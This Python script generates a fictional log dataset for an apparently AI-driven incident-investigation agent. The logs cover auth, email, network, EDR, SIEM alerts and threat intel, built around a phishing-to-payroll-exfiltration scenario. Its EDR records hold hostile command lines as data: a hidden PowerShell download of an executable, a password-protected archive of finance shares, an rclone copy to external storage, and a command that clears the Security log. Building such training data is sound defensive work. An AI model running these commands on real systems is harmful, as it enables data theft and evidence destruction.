"""Generates the sample security dataset used by the investigation agent.

Scenario (2026-09-28, all times UTC):
  A credential-phishing email hits the Finance team. jdoe clicks the link and
  enters credentials. The attacker spams MFA pushes until jdoe approves one,
  logs into the VPN from a foreign VPS, pivots to the finance file server,
  archives payroll data and exfiltrates it with a renamed rclone binary.

Mixed in are benign activity and unrelated alerts (a blocked brute-force
attempt, a travelling admin, a low-severity PUP) so the agent has to tell
the real incident apart from noise.

Run:  python data/generate_data.py
Output is deterministic (fixed seed), so re-running gives identical files.
"""

import csv
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(42)
OUT = Path(__file__).parent
DAY = datetime(2026, 9, 28)


def ts(hh: int, mm: int, ss: int = 0) -> str:
    return (DAY + timedelta(hours=hh, minutes=mm, seconds=ss)).strftime("%Y-%m-%dT%H:%M:%SZ")


def rand_ts(start_h: int = 3, end_h: int = 13) -> str:
    secs = random.randint(start_h * 3600, end_h * 3600)
    return (DAY + timedelta(seconds=secs)).strftime("%Y-%m-%dT%H:%M:%SZ")


def write_csv(name: str, rows: list[dict]) -> None:
    rows = sorted(rows, key=lambda r: r["timestamp"]) if "timestamp" in rows[0] else rows
    with open(OUT / name, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    print(f"  {name:<22} {len(rows):>4} rows")


# ---------------------------------------------------------------- users
USERS = [
    dict(username="jdoe", full_name="John Doe", department="Finance", title="Senior Financial Analyst",
         manager="kpatel", usual_location="Mumbai, IN", workstation="WS-FIN-023", privileged=False,
         account_type="human", notes=""),
    dict(username="kpatel", full_name="Kavya Patel", department="Finance", title="Finance Director",
         manager="ceo", usual_location="Mumbai, IN", workstation="WS-FIN-001", privileged=False,
         account_type="human", notes=""),
    dict(username="asmith", full_name="Alex Smith", department="IT", title="Systems Administrator",
         manager="lwong", usual_location="Mumbai, IN", workstation="WS-IT-002", privileged=True,
         account_type="human", notes="Approved business travel to Bengaluru 2026-09-27 to 2026-09-30 (TRV-5521)"),
    dict(username="lwong", full_name="Lin Wong", department="IT", title="IT Manager",
         manager="ceo", usual_location="Mumbai, IN", workstation="WS-IT-001", privileged=True,
         account_type="human", notes=""),
    dict(username="mchen", full_name="Mei Chen", department="Engineering", title="Software Engineer",
         manager="rgupta", usual_location="Pune, IN", workstation="WS-ENG-011", privileged=False,
         account_type="human", notes=""),
    dict(username="rgupta", full_name="Rohan Gupta", department="Engineering", title="Engineering Manager",
         manager="ceo", usual_location="Pune, IN", workstation="WS-ENG-001", privileged=False,
         account_type="human", notes=""),
    dict(username="priya.k", full_name="Priya Kulkarni", department="HR", title="HR Business Partner",
         manager="ceo", usual_location="Mumbai, IN", workstation="WS-HR-004", privileged=False,
         account_type="human", notes=""),
    dict(username="rlopez", full_name="Rosa Lopez", department="Sales", title="Account Executive",
         manager="ceo", usual_location="Mumbai, IN", workstation="WS-SAL-007", privileged=False,
         account_type="human", notes=""),
    dict(username="svc_backup", full_name="Backup Service", department="IT", title="Service Account",
         manager="lwong", usual_location="Datacenter", workstation="BKP-01", privileged=True,
         account_type="service", notes="Runs nightly backup 01:00-03:00 UTC to BKP-01"),
]

# --------------------------------------------------------------- assets
ASSETS = [
    dict(hostname="WS-FIN-023", ip="10.10.2.23", type="workstation", os="Windows 11", owner="jdoe", criticality="medium", zone="corp"),
    dict(hostname="WS-FIN-001", ip="10.10.2.1", type="workstation", os="Windows 11", owner="kpatel", criticality="medium", zone="corp"),
    dict(hostname="WS-IT-001", ip="10.10.1.1", type="workstation", os="Windows 11", owner="lwong", criticality="high", zone="corp"),
    dict(hostname="WS-IT-002", ip="10.10.1.2", type="workstation", os="Windows 11", owner="asmith", criticality="high", zone="corp"),
    dict(hostname="WS-ENG-001", ip="10.10.3.1", type="workstation", os="Ubuntu 24.04", owner="rgupta", criticality="medium", zone="corp"),
    dict(hostname="WS-ENG-011", ip="10.10.3.11", type="workstation", os="Ubuntu 24.04", owner="mchen", criticality="medium", zone="corp"),
    dict(hostname="WS-HR-004", ip="10.10.4.4", type="workstation", os="Windows 11", owner="priya.k", criticality="medium", zone="corp"),
    dict(hostname="WS-SAL-007", ip="10.10.6.7", type="workstation", os="macOS 15", owner="rlopez", criticality="low", zone="corp"),
    dict(hostname="FS-FIN-01", ip="10.10.5.10", type="file_server", os="Windows Server 2022", owner="kpatel", criticality="critical", zone="servers"),
    dict(hostname="DC-01", ip="10.10.0.5", type="domain_controller", os="Windows Server 2022", owner="lwong", criticality="critical", zone="servers"),
    dict(hostname="BKP-01", ip="10.10.0.20", type="backup_server", os="Ubuntu 22.04", owner="lwong", criticality="high", zone="servers"),
    dict(hostname="VPN-GW-01", ip="203.0.113.10", type="vpn_gateway", os="FortiOS 7.4", owner="lwong", criticality="critical", zone="dmz"),
    dict(hostname="WEB-01", ip="203.0.113.25", type="web_server", os="Ubuntu 24.04", owner="rgupta", criticality="high", zone="dmz"),
]
HOST_IP = {a["hostname"]: a["ip"] for a in ASSETS}

OFFICE_EGRESS = {"Mumbai, IN": "49.36.12.8", "Pune, IN": "49.36.40.2"}
BENIGN_DESTS = [
    ("142.250.183.14", "google.com"), ("52.109.8.19", "outlook.office365.com"),
    ("140.82.121.4", "github.com"), ("151.101.1.69", "stackoverflow.com"),
    ("13.107.42.14", "teams.microsoft.com"), ("104.18.32.7", "slack.com"),
]

# ------------------------------------------------------------ auth logs
auth = []


def add_auth(t, user, src_ip, geo, target, method, result, reason=""):
    auth.append(dict(timestamp=t, event_id=f"AUTH-{len(auth) + 1:05d}", username=user, source_ip=src_ip,
                     source_geo=geo, target_system=target, auth_method=method, result=result,
                     failure_reason=reason))


# benign daily logins
for u in USERS:
    if u["account_type"] == "service":
        add_auth(ts(1, 0, 3), u["username"], HOST_IP["BKP-01"], "Datacenter", "FS-FIN-01", "kerberos", "success")
        add_auth(ts(1, 0, 9), u["username"], HOST_IP["BKP-01"], "Datacenter", "DC-01", "kerberos", "success")
        continue
    ws_ip = HOST_IP[u["workstation"]]
    for _ in range(random.randint(2, 4)):
        add_auth(rand_ts(3, 12), u["username"], ws_ip, u["usual_location"], u["workstation"], "password+mfa", "success")
    add_auth(rand_ts(3, 12), u["username"], ws_ip, u["usual_location"], "O365", "sso", "success")
    if random.random() < 0.4:  # occasional fat-finger
        add_auth(rand_ts(3, 12), u["username"], ws_ip, u["usual_location"], u["workstation"], "password", "failure", "bad_password")

# jdoe is at their desk in Mumbai all morning (matters for impossible travel)
add_auth(ts(3, 55), "jdoe", "10.10.2.23", "Mumbai, IN", "WS-FIN-023", "password+mfa", "success")
add_auth(ts(3, 57), "jdoe", "10.10.2.23", "Mumbai, IN", "FS-FIN-01", "kerberos", "success")

# asmith travelling (benign, but looks like a new location)
add_auth(ts(4, 10), "asmith", "106.51.77.14", "Bengaluru, IN", "VPN-GW-01", "password+mfa", "success")
add_auth(ts(4, 12), "asmith", "10.20.0.31", "VPN", "WS-IT-002", "rdp", "success")

# brute force against WEB-01 (all blocked)
for i, user in enumerate(["admin", "root", "administrator", "test", "admin", "jenkins", "admin", "rgupta",
                          "admin", "deploy", "root", "admin", "ubuntu", "admin", "backup", "admin"] * 2):
    add_auth(ts(2, 30, i * 7), user, "198.51.100.77", "Sao Paulo, BR", "WEB-01", "ssh_password", "failure",
             "invalid_user" if user not in ("rgupta",) else "bad_password")
add_auth(ts(2, 34, 0), "-", "198.51.100.77", "Sao Paulo, BR", "WEB-01", "ssh_password", "blocked", "fail2ban_ban")

# ATTACK: MFA fatigue then VPN login from attacker VPS
ATK_IP, ATK_GEO = "45.137.21.9", "Amsterdam, NL"
add_auth(ts(3, 20), "jdoe", ATK_IP, ATK_GEO, "O365", "password", "success", "")  # creds work on O365 (no MFA on legacy)
for k in range(6):
    add_auth(ts(3, 30, k * 40), "jdoe", ATK_IP, ATK_GEO, "VPN-GW-01", "password+mfa_push", "failure", "mfa_denied")
add_auth(ts(3, 35, 10), "jdoe", ATK_IP, ATK_GEO, "VPN-GW-01", "password+mfa_push", "success", "mfa_approved")
add_auth(ts(3, 40), "jdoe", "10.20.0.57", "VPN", "FS-FIN-01", "ntlm", "success")
add_auth(ts(3, 41), "jdoe", "10.20.0.57", "VPN", "DC-01", "ldap", "success")
add_auth(ts(3, 44), "jdoe", "10.20.0.57", "VPN", "FS-FIN-01", "rdp", "success")

write_csv("auth_logs.csv", auth)

# ------------------------------------------------------------ email logs
emails = []


def add_email(t, sender, rcpt, subject, verdict, url="", attachment="", action="delivered", clicked=False):
    emails.append(dict(timestamp=t, message_id=f"MSG-{len(emails) + 1:05d}", sender=sender, recipient=rcpt,
                       subject=subject, url=url, attachment=attachment, spam_verdict=verdict,
                       delivery_action=action, link_clicked=clicked))


internal = [u["username"] for u in USERS if u["account_type"] == "human"]
subjects = ["Q3 forecast review", "Team lunch Friday", "Re: sprint planning", "Customer follow-up",
            "Updated leave policy", "Invoice #88213 approved", "Weekly sync notes", "Re: laptop refresh"]
for _ in range(30):
    s, r = random.sample(internal, 2)
    add_email(rand_ts(3, 12), f"{s}@acmecorp.com", f"{r}@acmecorp.com", random.choice(subjects), "clean")
add_email(ts(4, 5), "billing@vendor-supplies.in", "kpatel@acmecorp.com", "Invoice for September", "clean",
          attachment="Invoice_Sep.pdf")
add_email(ts(5, 0), "promo@cheap-deals.biz", "rlopez@acmecorp.com", "You WON a gift card!!!", "spam",
          url="http://cheap-deals.biz/claim", action="quarantined")

# ATTACK: phishing campaign
PHISH = dict(sender="it-support@m1crosoft-secure.com", subject="Action Required: Your password expires today",
             url="https://m1crosoft-secure.com/o365/login?session=8f2a", verdict="clean")
for r, clicked in [("jdoe", True), ("kpatel", False), ("priya.k", False), ("rlopez", False)]:
    add_email(ts(2, 48), PHISH["sender"], f"{r}@acmecorp.com", PHISH["subject"], PHISH["verdict"],
              url=PHISH["url"], clicked=clicked)
write_csv("email_logs.csv", emails)

# ---------------------------------------------------------- network logs
net = []


def add_flow(t, src_host, src_ip, dst_ip, dst_domain, port, proto, bytes_out, bytes_in, action="allow"):
    net.append(dict(timestamp=t, flow_id=f"NET-{len(net) + 1:05d}", src_host=src_host, src_ip=src_ip,
                    dst_ip=dst_ip, dst_domain=dst_domain, dst_port=port, protocol=proto,
                    bytes_out=bytes_out, bytes_in=bytes_in, action=action))


for a in ASSETS:
    if a["type"] != "workstation":
        continue
    for _ in range(random.randint(4, 7)):
        ip, dom = random.choice(BENIGN_DESTS)
        add_flow(rand_ts(3, 12), a["hostname"], a["ip"], ip, dom, 443, "https",
                 random.randint(2_000, 400_000), random.randint(20_000, 5_000_000))
# nightly backup (large but expected)
add_flow(ts(1, 5), "FS-FIN-01", "10.10.5.10", "10.10.0.20", "BKP-01", 873, "rsync", 3_950_000_000, 1_200_000)
add_flow(ts(4, 30), "WS-FIN-001", "10.10.2.1", "10.10.5.10", "FS-FIN-01", 445, "smb", 80_000, 2_400_000)

# ATTACK: jdoe clicks the phishing link
add_flow(ts(2, 55), "WS-FIN-023", "10.10.2.23", "185.220.101.45", "m1crosoft-secure.com", 443, "https", 4_812, 61_220)
add_flow(ts(2, 56), "WS-FIN-023", "10.10.2.23", "185.220.101.45", "m1crosoft-secure.com", 443, "https", 2_140, 1_904)
# ATTACK: VPN session and lateral movement
add_flow(ts(3, 35, 12), "external", ATK_IP, "203.0.113.10", "VPN-GW-01", 443, "ssl_vpn", 15_000_000, 90_000_000)
add_flow(ts(3, 40), "VPN-10.20.0.57", "10.20.0.57", "10.10.5.10", "FS-FIN-01", 445, "smb", 150_000, 8_400_000)
add_flow(ts(3, 41), "VPN-10.20.0.57", "10.20.0.57", "10.10.0.5", "DC-01", 389, "ldap", 40_000, 2_300_000)
add_flow(ts(3, 44), "VPN-10.20.0.57", "10.20.0.57", "10.10.5.10", "FS-FIN-01", 3389, "rdp", 2_100_000, 38_000_000)
# ATTACK: tool download and exfiltration from the file server
add_flow(ts(3, 52), "FS-FIN-01", "10.10.5.10", "185.220.101.45", "m1crosoft-secure.com", 443, "https", 3_100, 24_600_000)
for k in range(8):
    add_flow(ts(4, 5 + k * 3), "FS-FIN-01", "10.10.5.10", "103.75.190.12", "storage.fastsync-cloud.net", 443,
             "https", random.randint(480_000_000, 560_000_000), random.randint(80_000, 120_000))
# unrelated attacker traffic blocked at perimeter
add_flow(ts(2, 30), "external", "198.51.100.77", "203.0.113.25", "WEB-01", 22, "ssh", 90_000, 40_000)
add_flow(ts(2, 34, 5), "external", "198.51.100.77", "203.0.113.25", "WEB-01", 22, "ssh", 0, 0, "deny")
write_csv("network_logs.csv", net)

# -------------------------------------------------------- endpoint (EDR)
edr = [
    dict(timestamp=ts(3, 52, 30), event_id="EDR-00001", hostname="FS-FIN-01", username="jdoe",
         process_name="powershell.exe", parent_process="explorer.exe",
         command_line="powershell -w hidden -c iwr https://m1crosoft-secure.com/u.exe -OutFile C:\\ProgramData\\svchost_update.exe",
         file_hash_sha256="", severity="high", detection="Suspicious PowerShell download cradle"),
    dict(timestamp=ts(3, 58), event_id="EDR-00002", hostname="FS-FIN-01", username="jdoe",
         process_name="7z.exe", parent_process="cmd.exe",
         command_line="7z.exe a -pAcme2026! C:\\ProgramData\\bk.7z D:\\Shares\\Finance\\Payroll D:\\Shares\\Finance\\Tax",
         file_hash_sha256="", severity="high", detection="Password-protected archive of sensitive share"),
    dict(timestamp=ts(4, 4), event_id="EDR-00003", hostname="FS-FIN-01", username="jdoe",
         process_name="svchost_update.exe", parent_process="cmd.exe",
         command_line="svchost_update.exe copy C:\\ProgramData\\bk.7z fsync:bucket01 --transfers 8",
         file_hash_sha256="9c3e6d1f2b7a4e8c5d0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d",
         severity="critical", detection="Renamed rclone binary executing cloud copy"),
    dict(timestamp=ts(4, 30), event_id="EDR-00004", hostname="FS-FIN-01", username="jdoe",
         process_name="cmd.exe", parent_process="svchost_update.exe",
         command_line="cmd /c del /f /q C:\\ProgramData\\bk.7z & wevtutil cl Security",
         file_hash_sha256="", severity="critical", detection="Security event log cleared"),
    dict(timestamp=ts(6, 12), event_id="EDR-00005", hostname="WS-ENG-011", username="mchen",
         process_name="chrome.exe", parent_process="explorer.exe", command_line="chrome.exe --load-extension=coupon_helper",
         file_hash_sha256="1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809",
         severity="low", detection="Potentially unwanted browser extension"),
    dict(timestamp=ts(1, 0), event_id="EDR-00006", hostname="BKP-01", username="svc_backup",
         process_name="rsync", parent_process="cron", command_line="rsync -az /mnt/fs-fin-01/ /backup/daily/",
         file_hash_sha256="", severity="info", detection="Scheduled backup job"),
]
write_csv("endpoint_events.csv", edr)

# --------------------------------------------------------- SIEM alerts
alerts = [
    dict(timestamp=ts(2, 34), alert_id="ALRT-1001", title="SSH brute force against WEB-01", severity="medium",
         entity="198.51.100.77", source="SIEM", status="open",
         description="32 failed SSH logins in 4 minutes from 198.51.100.77; source banned by fail2ban."),
    dict(timestamp=ts(3, 5), alert_id="ALRT-1002", title="User reported phishing email", severity="medium",
         entity="priya.k", source="PhishReport", status="open",
         description="priya.k reported 'Action Required: Your password expires today' from it-support@m1crosoft-secure.com."),
    dict(timestamp=ts(3, 36), alert_id="ALRT-1003", title="MFA push fatigue", severity="high",
         entity="jdoe", source="IdP", status="open",
         description="6 denied MFA pushes followed by an approval for jdoe within 6 minutes."),
    dict(timestamp=ts(3, 36), alert_id="ALRT-1004", title="Impossible travel", severity="high",
         entity="jdoe", source="IdP", status="open",
         description="jdoe authenticated from Amsterdam, NL while active in Mumbai, IN."),
    dict(timestamp=ts(4, 11), alert_id="ALRT-1005", title="Login from new location", severity="low",
         entity="asmith", source="IdP", status="open",
         description="asmith VPN login from Bengaluru, IN (first seen)."),
    dict(timestamp=ts(4, 5), alert_id="ALRT-1006", title="Renamed rclone execution", severity="critical",
         entity="FS-FIN-01", source="EDR", status="open",
         description="svchost_update.exe (rclone) copying archive to external cloud storage."),
    dict(timestamp=ts(4, 30), alert_id="ALRT-1007", title="Large outbound data transfer", severity="critical",
         entity="FS-FIN-01", source="NDR", status="open",
         description="~4 GB sent from FS-FIN-01 to 103.75.190.12 (storage.fastsync-cloud.net) in 25 minutes."),
    dict(timestamp=ts(6, 13), alert_id="ALRT-1008", title="Potentially unwanted application", severity="low",
         entity="WS-ENG-011", source="EDR", status="open",
         description="Coupon helper browser extension installed by mchen."),
]
write_csv("alerts.csv", alerts)

# --------------------------------------------------------- threat intel
threat_intel = [
    dict(indicator="185.220.101.45", type="ip", verdict="malicious", confidence=90, tags=["phishing", "credential-harvesting"],
         first_seen="2026-09-20", description="Hosts O365 credential-phishing kits; linked to m1crosoft-secure.com."),
    dict(indicator="m1crosoft-secure.com", type="domain", verdict="malicious", confidence=95, tags=["phishing", "typosquat"],
         first_seen="2026-09-25", description="Typosquat of microsoft.com registered 3 days before campaign."),
    dict(indicator="45.137.21.9", type="ip", verdict="malicious", confidence=80, tags=["vps", "mfa-fatigue", "initial-access"],
         first_seen="2026-08-14", description="Bulletproof VPS seen in MFA-fatigue attacks against VPN gateways."),
    dict(indicator="103.75.190.12", type="ip", verdict="malicious", confidence=85, tags=["exfiltration", "rclone"],
         first_seen="2026-07-02", description="Cloud storage endpoint used by extortion groups for data theft."),
    dict(indicator="storage.fastsync-cloud.net", type="domain", verdict="malicious", confidence=85, tags=["exfiltration"],
         first_seen="2026-07-02", description="Resolves to 103.75.190.12; rclone-compatible storage backend."),
    dict(indicator="9c3e6d1f2b7a4e8c5d0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d", type="sha256", verdict="suspicious",
         confidence=70, tags=["rclone", "dual-use"], first_seen="2026-05-11",
         description="rclone v1.66 binary; legitimate tool frequently abused for exfiltration."),
    dict(indicator="198.51.100.77", type="ip", verdict="suspicious", confidence=60, tags=["scanner", "ssh-bruteforce"],
         first_seen="2026-01-03", description="Mass internet SSH scanner; opportunistic, not targeted."),
    dict(indicator="106.51.77.14", type="ip", verdict="benign", confidence=90, tags=["isp", "residential"],
         first_seen="2024-02-10", description="ACT Fibernet residential/hotel range, Bengaluru, IN."),
]
(OUT / "threat_intel.json").write_text(json.dumps(threat_intel, indent=2), encoding="utf-8")
print(f"  {'threat_intel.json':<22} {len(threat_intel):>4} records")

write_csv("users.csv", USERS)
write_csv("assets.csv", ASSETS)
